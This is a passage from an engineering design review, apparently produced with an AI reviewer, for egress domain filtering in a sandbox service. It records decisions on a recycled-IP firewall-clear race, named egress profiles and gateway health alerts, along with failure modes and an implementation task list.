Finding: TD2, P1, confidence 6/10 (medium confidence: verify this is actually an issue), reviewer plan-eng-review (Claude). `internal/service/events.go:187-197` (stop) and `:260-270` (destroy) call `ClearNetworkRules(previousIP)` and `ClearEgressPolicy(previousIP, …)` from asynchronous runtime events. The comment there says "clear them … before the IP is recycled to another container", but nothing orders that clear against a netns-slot reuse (`internal/network/netns/pool.go:94-97`). If a late event runs after a new sandbox received the IP, `ClearNetworkRules` removes the new sandbox's block-all DROP (fail-open). This is the netrules analog of A1, which D5 fixed for the gateway only.
Plan baseline: not in the plan.
Runtime evidence: code read; the event-versus-reuse ordering is not proven.
Comparison grid:

| Choice | Current | A | B | C |
|---|---|---|---|---|
| TD2 netrules clear on recycled IP | unordered, unchecked | TODOS.md entry (P1, investigate ordering, then owner-check the clear) | skip | new Phase 0 item P0-6: clears check that the IP still belongs to the event's sandbox (row lookup or slot owner) before deleting, with a regression test |

Question D20:
D20 — Track the netrules recycled-IP clear race as a TODO, or fix it in Phase 0?
Project/branch/task: eng review of plans/egress-domain-filtering.md (pre-existing netrules risk), branch fix/go-race-coverage-tests.
ELI10: When a sandbox stops or is destroyed, a background event later deletes the firewall rules for its old IP. The code assumes this always happens before the IP is reused, but the netns pool can hand the IP to a new sandbox first. If the late cleanup then runs, it can delete the new sandbox's block-all rule. It is the same bug D5 fixed for the gateway, in the older firewall code. I have read it in the code but not proven the timing.
Stakes if we pick wrong: a block-all sandbox could silently lose its block after an unlucky IP reuse, or we spend Phase 0 time on a race that cannot happen.
Recommendation: Add to TODOS.md because the timing is unproven, and a TODO with a clear investigation start keeps Phase 0 to verified holes.
Note: options differ in kind, not coverage — no completeness score.
Pros / cons:
A) Add to TODOS.md (recommended)
  ✅ Captured as P1 with a bounded investigation start (event ordering versus slot reuse)
  ✅ Phase 0 stays limited to holes verified in code
  ❌ If the race is real, block-all sandboxes keep the exposure until the TODO lands
B) Skip
  ✅ No extra work in this plan or the backlog
  ✅ Avoids chasing a race that may never fire
  ❌ A possible fail-open on block-all goes unrecorded
C) Fix in Phase 0
  ✅ Closes the netrules variant of the A1 race next to the other hole fixes
  ✅ Owner-checked clears are cheap even if the race is rare (human: ~4h / CC: ~30min)
  ❌ Adds work to Phase 0 for a race whose timing is not yet proven
Net: record it now with a clear start; decide the fix once the ordering is known.
Header: Clear race
Options:
A) Add to TODOS.md (recommended)
New TODOS.md entry "netrules clears can strip a recycled IP's rules" (P1) with What, Why, Pros, Cons, Start (`internal/service/events.go:187-197,260-270`; `internal/network/netns/pool.go:94-97`) and Depends on (none).
B) Skip
No entry and no change.
C) Fix in Phase 0
New P0-6: stop and destroy event clears confirm the IP still belongs to the event's sandbox (store row or netns slot owner) before deleting rules, with a regression test that adopts a new sandbox on the IP before the old sandbox's event is processed.

State: approved
Actual answer: C) Fix in Phase 0 (D20, answered 2026-10-05)
Accepted scope: New P0-6: stop and destroy event clears confirm the IP still belongs to the event's sandbox (store row or netns slot owner) before deleting rules, with a regression test that adopts a new sandbox on the IP before the old sandbox's event is processed.
History: none

### TD3: Named egress profiles (open question Q5)
Finding: TD3, P3, confidence 7/10, plan §10 Q5, reviewer plan-eng-review (Claude). In cluster mode the 4 KB inline recovery cap (`internal/cluster/recovery_replication.go`, `inlineRecoveryMaxBytes = 4096`) limits one sandbox's allowlist to roughly 100-150 short hostnames. Named profiles (`egress_profile: "python-dev"`, stored once and referenced by name) would lift that limit and allow "update every sandbox using this profile" in one call, the OpenShell model.
Plan baseline: Q5 open.
Runtime evidence: cap read in code.
Comparison grid:

| Choice | Current (plan) | A | B | C |
|---|---|---|---|---|
| TD3 named egress profiles | open question | TODOS.md entry (P3, wait for demand) | skip; close Q5 as "not planned" | new Phase 2 item |

Question D21:
D21 — Track named egress profiles as a TODO, or plan them now?
Project/branch/task: eng review of plans/egress-domain-filtering.md (open question Q5), branch fix/go-race-coverage-tests.
ELI10: In cluster mode each sandbox's settings must fit in a 4 KB record, which caps an allowlist at roughly 100 to 150 short hostnames. Named profiles would store a list once ("python-dev") and let sandboxes refer to it, which lifts the cap and lets you update every sandbox using a profile in one call. Nobody has asked for it yet.
Stakes if we pick wrong: building it early adds a new stored object and API with no user; never recording it loses a known limit and its fix.
Recommendation: Add to TODOS.md because no one has hit the cap yet, and the entry keeps the fix ready when someone does.
Note: options differ in kind, not coverage — no completeness score.
Pros / cons:
A) Add to TODOS.md (recommended)
  ✅ The known 4 KB limit and its fix are recorded for whoever hits it first
  ✅ No new stored object or API before there is demand
  ❌ Large allowlists in cluster mode keep failing with 400 until it is built
B) Skip
  ✅ Nothing to maintain or revisit
  ✅ Keeps the API surface small
  ❌ The cap and its known fix are not written down anywhere
C) Build in Phase 2
  ✅ Lifts the cap and adds bulk policy updates alongside live updates
  ✅ Matches the OpenShell policy model users asked about (human: ~1 week / CC: ~1 day)
  ❌ A new stored object, API, SDK surface and cluster replication with no current user
Net: write it down now; build it when the first large allowlist hits the cap.
Header: Profiles
Options:
A) Add to TODOS.md (recommended)
New TODOS.md entry "Named egress profiles" (P3) with What, Why, Pros, Cons, Start (`internal/cluster/recovery_replication.go` cap; plan Q5) and Depends on (Phase 2 PUT). Q5 closes as "tracked in TODOS.md".
B) Skip
No entry. Q5 closes as "not planned".
C) Build in Phase 2
New Phase 2 item: `egress_profile` objects stored once and replicated, referenced by sandboxes; a profile update re-applies to every sandbox that references it; 5 SDKs and docs.

State: approved
Actual answer: C) Build in Phase 2 (D21, answered 2026-10-06)
Accepted scope: New Phase 2 item: `egress_profile` objects stored once and replicated, referenced by sandboxes; a profile update re-applies to every sandbox that references it; 5 SDKs and docs. Q5 closes as "built in Phase 2". Carried with this answer: profile replication touches `internal/cluster`, so CLAUDE.md rule 6 applies (a regression test next to the changed file and a PR call-out on split-brain, replay safety and leader change; a no-op when cluster mode is off).
History: none

### A9: No health signal for the egress-gateway process
Finding: A9, P2, confidence 8/10, found while writing failure modes. Reviewer plan-eng-review (Claude).
- D9 makes `sandboxd egress-gateway` a separate process that every FQDN-mode sandbox on the node depends on. The plan defines no metric or alert for it.
- If it dies or wedges, FQDN sandboxes fail closed (DNS timeouts, refused connections), which is safe but silent to the operator until users report it.
- The repo already exports `aerolvm_*` expvar metrics (e.g. `pkg/docker/netrules/metrics.go:12`) and ships Prometheus alerts in `setup/prometheus/sandboxd-alerts.yml` (e.g. `SandboxdAuditEgressBudgetExceeded`, line 406).
Plan baseline: no observability item in the plan.
Runtime evidence: alert file and expvar convention read in code.
Comparison grid:

| Choice | Current (plan) | A | B |
|---|---|---|---|
| A9 gateway observability | none | sandboxd exports `aerolvm_egress_gateway_up` (last successful UDS heartbeat), `aerolvm_egress_gateway_sync_age_seconds`, `aerolvm_egress_denied_total{reason}` and `aerolvm_egress_fqdn_sandboxes`; new alert `SandboxdEgressGatewayDown` (gateway down for 1 minute while the node has FQDN sandboxes) in `setup/prometheus/sandboxd-alerts.yml`, plus a runbook entry | none; rely on user reports and logs |
| D9 separate process | approved | unchanged | unchanged |

Question D22:
D22 — Add health metrics and an alert for the new egress-gateway process?
Project/branch/task: eng review of plans/egress-domain-filtering.md (D9 process, operations), branch fix/go-race-coverage-tests.
ELI10: Every hostname-filtered sandbox on a node now depends on the egress-gateway process. If it crashes or hangs, those sandboxes lose DNS and web access. That is safe, because nothing leaks, but nobody running the cluster finds out until users complain. The repo already has the metric and alert plumbing; this adds a gateway-up signal, a few counters, and one alert.
Stakes if we pick wrong: a dead gateway quietly breaks every filtered sandbox on a node until someone files a ticket.
Recommendation: Add metrics + alert because a fail-closed dependency needs a signal, and the plumbing already exists.
Completeness: A=10/10, B=5/10
Pros / cons:
A) Add metrics + alert (recommended)
  ✅ Operators get paged when a node's gateway is down, before users notice
  ✅ Reuses the expvar and Prometheus alert conventions already in the repo (human: ~3h / CC: ~20min)
  ❌ Four more metrics, one more alert and a runbook entry to maintain
B) No metrics
  ✅ Nothing new to export or maintain
  ✅ Gateway logs still record failures for anyone who looks
  ❌ A dead gateway goes unnoticed until users report broken DNS or downloads
Net: a fail-closed dependency without a health signal fails silently for operators.
Header: Gateway alert
Options:
A) Add metrics + alert (recommended)
sandboxd exports `aerolvm_egress_gateway_up` (last successful UDS heartbeat), `aerolvm_egress_gateway_sync_age_seconds`, `aerolvm_egress_denied_total{reason}` and `aerolvm_egress_fqdn_sandboxes`. New alert `SandboxdEgressGatewayDown` (gateway down for 1 minute while the node has FQDN sandboxes) in `setup/prometheus/sandboxd-alerts.yml`, plus a runbook entry in `setup/runbooks/`. Tests: the gauge flips on heartbeat loss and recovery.
B) No metrics
No new metrics or alerts. Gateway failures show up in logs and user reports only.

State: approved
Actual answer: A) Add metrics + alert (D22, answered 2026-10-06)
Accepted scope: sandboxd exports `aerolvm_egress_gateway_up` (last successful UDS heartbeat), `aerolvm_egress_gateway_sync_age_seconds`, `aerolvm_egress_denied_total{reason}` and `aerolvm_egress_fqdn_sandboxes`. New alert `SandboxdEgressGatewayDown` (gateway down for 1 minute while the node has FQDN sandboxes) in `setup/prometheus/sandboxd-alerts.yml`, plus a runbook entry in `setup/runbooks/`. Tests: the gauge flips on heartbeat loss and recovery.
History: none

Approval readiness: PASS. Checked 2026-10-06. Every accepted remedy cites its own answer or an exact prior approval:
- scope: D2, D3
- S1: D4; S2: D2; S3: factual correction
- A1-A7: D5-D11; A8: under D4; A9: D22
- CQ1-CQ3: D12-D14; CQ4: factual correction
- T1: D15; T2: D16
- PF1: D17; PF2: D18
- TD1-TD3: D19-D21
No pending choices.

## NOT in scope

- **IPv6 egress filtering.** AAAA answers get NODATA; plan Q4 stays open for
  implementation.
- **QUIC/HTTP3.** UDP 443 is rejected (fails fast) so clients fall back to TCP.
- **TLS interception and per-method/path rules.** Phase 3, gated on demand
  (§5.9). Domain fronting stays a documented residual until then.
- **Firecracker.** Phase 4, blocked on the TODOS.md "Audit Firecracker outbound
  NAT path" item.
- **Hostnames in deny lists.** Rejected everywhere (D15), as in E2B.
- **Ask-to-allow approval flow** (a denied request opens an approval for a
  human or supervisor agent). A CEO candidate offered on request; not taken up.
- **Live `aerolvm egress allow` CLI verb.** A CEO candidate offered on request;
  not taken up (P2-3 adds `--allow-host` on create only).
- **A scheduled built-in-profile freshness job.** Declined in CEO D12 (accepted
  shortcut); upgrade when a user reports a stale profile.
- **Plan-level open questions left for implementation:**
  - Q4 (IPv6);
  - Q10 (docker user-defined networks).

  Q3 was resolved by CEO D8 and Q9 by the spec review 2 self-test.

## What already exists

| Existing piece | Location | Use in this plan |
|---|---|---|
| DNS responder pattern (miekg/dns, singleflight) | `internal/routedns/responder.go` | Pattern reused for the DNS filter; the package itself is not reused (different purpose). |
| SNI routing on ingress | caddy-l4 config, `internal/routedns` | Proves the SNI technique in this stack. Not reused for egress: per-sandbox Caddy routes don't scale. |
| Hostname matcher and SSRF dial control | `pkg/isolate/egress.go:223,258,287` | Moved into `pkg/egresspolicy` and shared by isolate, WASM, the DNS filter and the proxy; allow-wins replaces deny-wins (D4, D15). |
| Dead duplicate matcher | `internal/runtime/isolate/egress.go:25-74` | Deleted (CQ4). |
| Splice with buffered-prefix replay | `internal/service/l4proxy.go:143-163` | Moved to `internal/netsplice`, half-close fixed, shared with the proxy (D12). |
| Per-key and global connection limiter | `internal/service/l4proxy.go:80-135` | Moved to `internal/netsplice` and reused for proxy caps (D17). |
| netrules manager | `pkg/docker/netrules/manager.go` | Extended: mixed ACCEPT-above-DROP ordering (D4), `AEROLVM-INPUT` (D8), owner-checked event clears (D20). |
| Lazy bootstrap latch | `internal/service/service.go:319-320,3770` | Shape for `EnsureEgressGatewayReady`. |
| Egress audit pipeline | `internal/service/secret_audit.go:2489,2521` | Extended with `Result`/`Reason` for denials (H5). |
| expvar metrics + Prometheus alerts | `pkg/docker/netrules/metrics.go:12`, `setup/prometheus/sandboxd-alerts.yml` | Conventions for gateway metrics and `SandboxdEgressGatewayDown` (D22). |
| Per-sandbox resolv.conf generator | `internal/runtime/containerd/hosts.go:52` | Reused for warm-park containers (D14). |
| WASM NetMediator | `pkg/wasm/worker/netmediator.go:95` | Extended with hostname/CIDR policy and SNI check. |
| Strict spec commit | `Cluster.UpsertSpec` (`internal/cluster/client.go:568`) | Called with its error surfaced for PUT (D10), instead of best-effort `replicateSpecPatch`. |

## Diagrams

Control plane after D9 and D10:

```
 API client ──► sandboxd (owner node; clusterForwardWrap forwards non-owner calls)
                  │  create: driver DROP ─► Attach ─► ClearBlockAll
                  │  PUT:    validate ─► strict UpsertSpec (cluster) ─► store ─► apply
                  │  events: Detach(id, ip) + owner-checked netrules clears
                  ▼  UDS (version handshake, heartbeat, Sync)
            sandboxd egress-gateway  (own systemd unit; snapshot on disk)
                  ├─ nft inet aerolvm_egress  (sets replaced atomically, D13)
                  ├─ DNS filter  :53054  ◄── redirected udp/tcp 53
                  └─ SNI/Host proxy :15080 ◄── redirected tcp 80/443
                         └─ internal/netsplice (splice + connLimiter)
 sandboxd exports aerolvm_egress_gateway_up ─► SandboxdEgressGatewayDown alert
```

FQDN create flow:

```
validate (pkg/egresspolicy) ─► driver-facing copy (BlockAll=true, no CIDRs)
   ─► driver create (installs DROP) ─► Attach over UDS ─┬─ ok ─► ClearBlockAll ─► running, filtered
                                                       └─ fail / gateway down / skew ─► remove container, 503
```

Policy PUT flow (Phase 2):

```
validate ─► per-sandbox mutex ─► [cluster] UpsertSpec ─┬─ fail ─► 503 spec_commit_failed, nothing changed
                                                       └─ ok ─► store ─► apply (tighten first) ─┬─ ok ─► 200
                                                                                               └─ fail ─► egress_hold set (D16), 503 apply_failed_held
```

Inline diagrams to add in code: `internal/egress/gateway.go` (ownership and
blocked-bit invariants), `internal/egress/nft.go` (chain and set layout, as in
§5.2), `internal/netsplice/splice.go` (half-close sequence).

## Failure modes

| New path | Realistic failure | Handling | Test | User sees |
|---|---|---|---|---|
| Create, FQDN mode | egress-gateway down or version-skewed | create fails, container removed (G7) | EF-39 | clear 503 |
| Running FQDN sandbox | gateway crashes | redirected ports refuse, fail closed; alert after 1 min (D22) | EF-38, EF-46 | DNS timeouts and refused connections; operator is paged |
| Gateway restart | snapshot missing or corrupt | kernel sets untouched until `Sync` (D13) | EF-38 | nothing |
| DNS filter | upstream resolver down | SERVFAIL | dnsfilter unit | resolution failure |
| Proxy | upstream dial fails | client connection closed; denial audited | proxy unit (Test Plan edge cases) | TLS or connection error |
| Proxy | one sandbox floods connections | cap, close, audit (D17) | EF-37 | only that sandbox is refused |
| IP reuse | late Detach or event clear for the old owner | owner-checked (D5, D20) | EF-35, EF-41 | nothing |
| PUT, cluster | Raft commit fails | 503, nothing changed (D10) | A6 test | clear 503; retry converges |
| PUT apply | nft or netrules write fails | block-all + 503 | EF-30 | clear 503; sandbox fails closed |
| Old kernel | nft probe fails | FQDN creates 501 | EF-17 | clear 501 |
| Warm pool | image has no resolv.conf | generated mount (D14) | EF-40 | nothing |

| Host with INPUT policy DROP (ufw) | redirected DNS and proxy traffic dropped | startup self-test → node unavailable, 501 on gateway-mode creates (spec review 2) | self-test unit | clear 501 |
| Attach fails on start, reconcile, docker start event or recreate | gateway down or version-skewed | BlockAll kept; `egress_status: "unavailable"`; metric; reconcile retries | service unit | status field + metric |

Critical gaps (no test, no handling and silent): **none**. The INPUT-DROP host
case would have been one before the spec review 2 self-test.

## Worktree parallelization strategy

| Step | Modules touched | Depends on |
|------|----------------|------------|
| Shared splice + limiter (D12, D17) | `internal/netsplice`, `internal/service` (l4wake only) | — |
| Grammar + isolate migration (D4, D15, CQ4) | `pkg/egresspolicy`, `pkg/isolate`, `internal/runtime/isolate` | — |
| Phase 0 netrules + events (P0-5, P0-6, P0-4) | `pkg/docker/netrules`, `internal/service` (events) | — |
| Phase 0 runtime caps + WASM block-all (P0-1, P0-2) | `internal/runtime/containerd`, `pkg/docker`, `internal/service` (wasm) | — |
| Warm-park DNS (D14) | `internal/runtime/containerd` | Phase 0 runtime caps (same module) |
| Gateway core + process (D5, D9, D13, D18, A8, S2) | `internal/egress/...`, `cmd/sandboxd`, `packaging`, `scripts`, `Terraform`, `Ansible` | grammar, shared splice |
| Proxy + DNS filter (D6, D7, D17) | `internal/egress/proxy`, `internal/egress/dnsfilter` | gateway core |
| Precedence + E2B facade (D4, D11) | `pkg/api/e2b`, `internal/service` (validate), `pkg/docker/netrules` | grammar, Phase 0 netrules |
| Service chokepoint + WASM mediator | `internal/service`, `pkg/wasm/worker` | gateway core, grammar |
| Metrics + alert (D22) | `internal/service`, `setup/prometheus`, `setup/runbooks` | gateway process |
| Explainable and fail-fast denials (CEO D4, D10) | `internal/egress/...`, `pkg/wasm/worker`, `pkg/isolate` | proxy + DNS filter |
| Audit event stream (spec review 1) | `internal/egress`, `internal/service` | gateway process |
| Universal `CAP_NET_RAW` drop (CEO D8) | `internal/runtime/containerd`, `pkg/docker` | Phase 0 runtime caps (same modules) |
| Integration UCs (D16) | `integration-tests/suite` | all Phase 1 |
| Phase 2 (D10, D19, D21) | `internal/service`, `pkg/api/v1`, `pkg/api/e2b`, `internal/cluster`, `sdk/*`, `docs` | Phase 1 |
| Phase 2 CEO items: learn mode, built-in profiles, check endpoint (CEO D2, D3, D5, D11) | `internal/egress`, `pkg/egresspolicy`, `pkg/api/v1`, `sdk/*`, `docs` | named profiles (P2-6) for learn-to-profile and built-ins; the check endpoint only needs `pkg/egresspolicy` |
| Phase 3 (CEO D6, D7, D9) | `internal/egress/proxy`, `pkg/secrets`, runtimes | Phase 2; demand gate |

**Parallel lanes:**
- Lane A: shared splice → proxy and DNS filter (once the gateway core lands).
- Lane B: grammar + isolate → WASM mediator.
- Lane C: Phase 0 netrules + events → precedence in netrules.
- Lane D: Phase 0 runtime caps → warm-park DNS (shared `internal/runtime/containerd`).

**Execution order:**
1. Launch A, B, C and D together.
2. Merge the grammar and the shared splice into the stack, then start the gateway core + process.
3. Then run the proxy/DNS filter, the service chokepoint and the E2B facade in parallel.
4. Then metrics, then the integration UCs, then Phase 2.

Per repo practice, these are stacked PRs; merge nothing until the stack is green.

**Conflict flags:**
- `internal/service` is touched by events (C), wasm (D), validate (facade), the chokepoint, metrics and Phase 2. Sequence those edits.
- `pkg/docker/netrules` is touched by Lane C and the precedence step. Keep them in one lane.

## Implementation Tasks
Synthesized from this review's findings. Each task derives from a specific
finding above. Run with Claude Code or Codex; checkbox as you ship.
Effort ratios assumed: architecture ~5x, features ~30x, tests ~50x, bug fix
with regression ~20x (human ÷ CC).

- [ ] **T1 (P1, human: ~4h / CC: ~30min)** — internal/netsplice — Extract `spliceConns` and fix half-close
  - Surfaced by: Code Quality — CQ1 (`internal/service/l4proxy.go:143-163`), D12
  - Files: `internal/netsplice/`, `internal/service/l4proxy.go`, `internal/service/l4wake.go`, `internal/service/l4proxy_test.go`
  - Verify: `go test ./internal/netsplice/... ./internal/service/...` (half-close test passes)
- [ ] **T2 (P1, human: ~3h / CC: ~20min)** — internal/netsplice + proxy — Move `connLimiter`; add per-sandbox and node proxy caps
  - Surfaced by: Performance — PF1, D17
  - Files: `internal/netsplice/`, `internal/egress/proxy/`, `internal/config/config.go`, `setup/config-defaults.md`
  - Verify: proxy unit tests for the per-sandbox cap, global cap and release (EF-37)
- [ ] **T3 (P1, human: ~2 days / CC: ~2h)** — service + netrules + e2b — Allow-wins precedence for mixed lists
  - Surfaced by: Scope Challenge — S1 (`pkg/api/e2b/handlers.go:728-745`), D4; A8
  - Files: `internal/service/service.go` (validateEgressPolicy), `pkg/docker/netrules/manager.go`, `pkg/api/e2b/handlers.go`, `pkg/models/types.go` (comments)
  - Verify: EF-36; rewritten `service_coverage_test.go:344,523`; netrules mixed-order tests
- [ ] **T4 (P1, human: ~3h / CC: ~20min)** — pkg/egresspolicy + isolate — Migrate isolate, allow-wins, hostname-deny 400, delete dead copy
  - Surfaced by: Test Review — T1, D15; Code Quality — CQ4
  - Files: `pkg/egresspolicy/`, `pkg/isolate/egress.go`, `pkg/isolate/egress_test.go`, `internal/runtime/isolate/egress.go`, `internal/service/isolate.go`
  - Verify: EF-45; `go test ./pkg/isolate/... ./internal/runtime/isolate/...`
- [ ] **T5 (P1, human: ~3h / CC: ~20min)** — internal/egress — Owner-checked Detach and stale-owner purge on Attach
  - Surfaced by: Architecture — A1, D5
  - Files: `internal/egress/gateway.go`, tests
  - Verify: EF-35
- [ ] **T6 (P1, human: ~2h / CC: ~15min)** — internal/egress/proxy — Match outer SNI; never reject on the ECH extension
  - Surfaced by: Architecture — A2, D6
  - Files: `pkg/egresspolicy/` (SNI peek), `internal/egress/proxy/`
  - Verify: EF-07 (GREASE passes, real ECH denied)
- [ ] **T7 (P1, human: ~3h / CC: ~20min)** — internal/egress — Input-chain drop for FQDN sources
  - Surfaced by: Architecture — A3, D7
  - Files: `internal/egress/nft.go`
  - Verify: EF-33
- [ ] **T8 (P1, human: ~1 day / CC: ~1h)** — netrules — P0-5 `AEROLVM-INPUT` for block-all and CIDR-allowlist sandboxes
  - Surfaced by: Architecture — A4, D8
  - Files: `pkg/docker/netrules/`, `pkg/daemon/container_engine_wiring.go`
  - Verify: EF-34 (unit + integration)
- [ ] **T9 (P1, human: ~1 week / CC: ~1 day)** — cmd/sandboxd + internal/egress + deploy — `sandboxd egress-gateway` process
  - Surfaced by: Architecture — A5, D9
  - Files: `cmd/sandboxd/`, `internal/egress/` (UDS server and client, snapshot), `packaging/`, `scripts/install.sh`, `Terraform/`, `Ansible/`
  - Verify: EF-38, EF-39
- [ ] **T10 (P1, human: ~3h / CC: ~20min)** — internal/service — Strict spec-first commit for policy PUT
  - Surfaced by: Architecture — A6, D10
  - Files: `internal/service/` (UpdateNetworkPolicy)
  - Verify: an UpsertSpec failure → 503 and nothing changed
- [ ] **T11 (P3, human: ~30min / CC: ~5min)** — docs — Document the facade's stricter `allowOut`-only reading
  - Surfaced by: Architecture — A7, D11
  - Files: `docs/src/content/docs/egress-domain-filtering.mdx`
  - Verify: `make docs-build`
- [ ] **T12 (P1, human: ~4h / CC: ~30min)** — internal/egress — Default-verdict source sets and `deny_cidr`
  - Surfaced by: Architecture — A8 (necessary under D4)
  - Files: `internal/egress/nft.go`, `internal/egress/dnsfilter/`, `internal/egress/proxy/`
  - Verify: EF-36 deny-list-mode rows
- [ ] **T13 (P1, human: ~3h / CC: ~20min)** — internal/egress — Atomic set replace and snapshot-first startup
  - Surfaced by: Code Quality — CQ2, D13
  - Files: `internal/egress/nft.go`, `internal/egress/snapshot.go`
  - Verify: EF-38 (membership never empty, using the nft fake)
- [ ] **T14 (P2, human: ~3h / CC: ~20min)** — containerd — Generated resolv.conf for parked containers
  - Surfaced by: Code Quality — CQ3, D14
  - Files: `internal/runtime/containerd/warm_park.go`, `internal/runtime/containerd/hosts.go`
  - Verify: EF-40
- [ ] **T15 (P1, human: ~4h / CC: ~30min)** — internal/egress — Learned-IP lifecycle (established accept, conntrack flush, flush on Detach and reuse)
  - Surfaced by: Scope Challenge — S2, D2
  - Files: `internal/egress/nft.go`, `internal/egress/dnsfilter/`
  - Verify: an SSH clone longer than the TTL completes; EF-35
- [ ] **T16 (P2, human: ~4h / CC: ~30min)** — internal/egress/dnsfilter — Shadow-map cache, per-op conns, microbenchmark
  - Surfaced by: Performance — PF2, D18
  - Files: `internal/egress/`, `internal/egress/dnsfilter/`
  - Verify: EF-44; `go test -bench` on the answer path
- [ ] **T17 (P1, human: ~2 days / CC: ~3h)** — integration-tests — FQDN UCs on containerd, docker and gVisor, plus a legacy-iptables probe
  - Surfaced by: Test Review — T2, D16
  - Files: `integration-tests/suite/`, `integration-tests/suite/harness/`
  - Verify: `make integration-*` per scenario (AWS cost)
- [ ] **T18 (P2, human: ~4h / CC: ~30min)** — pkg/api/e2b — `updateNetwork` route (Phase 2)
  - Surfaced by: TODO review — TD1, D19
  - Files: `pkg/api/e2b/`
  - Verify: EF-42
- [ ] **T19 (P1, human: ~4h / CC: ~30min)** — internal/service — P0-6 owner-checked netrules event clears
  - Surfaced by: TODO review — TD2 (`internal/service/events.go:187-197,260-270`), D20
  - Files: `internal/service/events.go`, tests
  - Verify: EF-41
- [ ] **T20 (P2, human: ~1 week / CC: ~1 day)** — service + cluster + SDKs — Named egress profiles (Phase 2)
  - Surfaced by: TODO review — TD3, D21
  - Files: `internal/service/`, `internal/cluster/` (+ regression test), `internal/store/`, `pkg/api/v1/`, `sdk/*`, `docs/`
  - Verify: EF-43; the cluster regression test next to the changed file
  - Scope from spec review 1:
    - the Phase 2 wire contract (profile CRUD, owner scoping, 409 on delete in
      use, union and caps);
    - the owner-local FSM watcher fan-out, rate-limited, failing closed per
      sandbox.
- [ ] **T21 (P2, human: ~3h / CC: ~20min)** — internal/service + setup — Gateway metrics, alert and runbook
  - Surfaced by: Architecture — A9 (found during failure modes), D22
  - Files: `internal/service/`, `setup/prometheus/sandboxd-alerts.yml`, `setup/runbooks/`
  - Verify: EF-46
- [ ] **T22 (P1, human: ~3 days / CC: ~3h)** — internal/egress + wasm + isolate — Explainable and fail-fast denials
  - Surfaced by: CEO review — X3 (CEO D4) and R3 (CEO D10)
  - Files: `internal/egress/dnsfilter/`, `internal/egress/proxy/`, `internal/egress/nft.go`, `pkg/wasm/worker/netmediator.go`, `pkg/isolate/egress.go`, docs
  - Verify: EF-47, EF-56
- [ ] **T23 (P2, human: ~4 days / CC: ~4h)** — internal/egress + service + SDKs — Learn mode (P2-7)
  - Surfaced by: CEO review — X1 (CEO D2); contract from spec review 1
  - Files: `internal/egress/`, `internal/service/`, `pkg/models/types.go`, `pkg/api/v1/`, `sdk/*`, docs
  - Verify: EF-48
- [ ] **T24 (P2, human: ~3 days / CC: ~3h)** — pkg/egresspolicy — Built-in profiles, pinned at create (P2-8)
  - Surfaced by: CEO review — X2 (CEO D3), R4 (CEO D11), R5 (CEO D12, operator-run freshness)
  - Files: `pkg/egresspolicy/profiles/`, `internal/service/`, `integration-tests/suite/`
  - Verify: EF-49
- [ ] **T25 (P2, human: ~2 days / CC: ~2h)** — api + SDKs — Policy check endpoint (P2-9)
  - Surfaced by: CEO review — X4 (CEO D5)
  - Files: `pkg/api/v1/`, `pkg/egresspolicy/`, `sdk/*`, docs
  - Verify: EF-50
- [ ] **T26 (P1, human: ~3h / CC: ~20min)** — docker + containerd — Drop `CAP_NET_RAW` for every sandbox (P0-2)
  - Surfaced by: CEO review — R1 (CEO D8)
  - Files: `internal/runtime/containerd/security.go`, `pkg/docker/client.go`, release notes
  - Verify: EF-51
- [ ] **T27 (P3, human: ~2 weeks / CC: ~2 days)** — internal/egress/proxy — P3-1 inspection with method/path rules
  - Surfaced by: CEO review — R2 (CEO D9)
  - Files: `internal/egress/proxy/`, `pkg/egresspolicy/`, `pkg/secrets/` (CA), runtime CA bundle mounts
  - Verify: EF-52, EF-53
- [ ] **T28 (P3, human: ~3 weeks / CC: ~3 days)** — internal/egress/proxy + secrets — P3-2 credential injection
  - Surfaced by: CEO review — X5 (CEO D6), R2 (CEO D9)
  - Files: `internal/egress/proxy/`, `pkg/secrets/`, `internal/service/`
  - Verify: EF-54
- [ ] **T29 (P3, human: ~4 weeks / CC: ~1 week)** — internal/egress — P3-3 per-binary rules on runc
  - Surfaced by: CEO review — X6 (CEO D7), R2 (CEO D9), spec review feasibility #3
  - Files: `internal/egress/`, `internal/service/`
  - Verify: EF-55
- [ ] **T30 (P1, human: ~1 day / CC: ~1h)** — internal/egress + service — Gateway → sandboxd audit event stream
  - Surfaced by: spec review 1 feasibility #1 (audit can't cross the D9 process boundary)
  - Files: `internal/egress/` (ring buffer, UDS stream), `internal/service/secret_audit.go`
  - Verify: events reach the hash chain; drops counted while sandboxd is down

## Unresolved decisions

None. Every choice raised in this review (D2-D22) has an answer, and Approval
readiness passed. Plan-level open questions Q4, Q7, Q8 and Q10 were not raised
as review choices; see "NOT in scope". Q3 and Q9 were resolved in the CEO
review.

## Completion summary

- Step 0: Scope Challenge — scope accepted as-is (D2 kept the learned-IP path; D3 kept the four-package layout)
- Architecture Review: 9 issues found (A1-A9)
- Code Quality Review: 4 issues found (CQ1-CQ4)
- Test Review: diagram produced, 2 gaps identified (T1 isolate regression contract, T2 live coverage depth); 46 new-path gaps all mapped to planned or approved tests
- Performance Review: 3 issues found (PF1, PF2, plus a conntrack-dump cost note)
- NOT in scope: written
- What already exists: written
- TODOS.md updates: 3 items proposed to user; all 3 chosen as in-plan work (P2-5, P0-6, P2-6), 0 added to TODOS.md
- Failure modes: 0 critical gaps flagged
- Unresolved decisions: 0 in this review
- Outside voice: codex unavailable (`model_unusable`: gstack's Codex model resolver script is missing from the install); Claude-subagent fallback unavailable (no bounded-wait task-output tool in this session). No outside coverage.
- Parallelization: 4 lanes, 4 parallel at launch / 8 sequential steps after
- Lake Score: 14/15 (every scored answer picked the 10/10 option except D6, where the best option was 9/10)
- Scope Challenge findings (reported separately): S1-S3; Outside Voice findings: none (unavailable)

## Suppressed findings (appendix)

- (confidence 4) nf_tables NAT and iptables-legacy NAT hook coexistence on
  legacy hosts is unverified. Not promoted; covered by the D16 legacy-host
  probe.
- (confidence 4) dockerd's default-bridge IPAM may reuse a freed IP immediately,
  widening the A1/TD2 races on the docker engine. Not verified; the D5 and D20
  owner checks cover it either way.
- (confidence 7, no change) The conntrack flush on narrowing dumps the whole
  conntrack table per PUT (`ConntrackDeleteFilters`), O(table size); PUT rate
  bounds it.

# CEO review: `/plan-ceo-review` 2026-10-06

Target: `plans/egress-domain-filtering.md` (this file, as amended by the
2026-10-05/06 eng review). Base branch: `main`. Review depth:
implementation-ready (default). UI scope: none (docs only), so Section 11 is
skipped.

## CEO Step 0 evidence

**0A. Premise.**
- **The real problem.** A sandbox can't express the most common real policy,
  "package registries plus GitHub, nothing else". Its DNS is either dead or wide
  open. DNS was the actual escape channel in 2026:
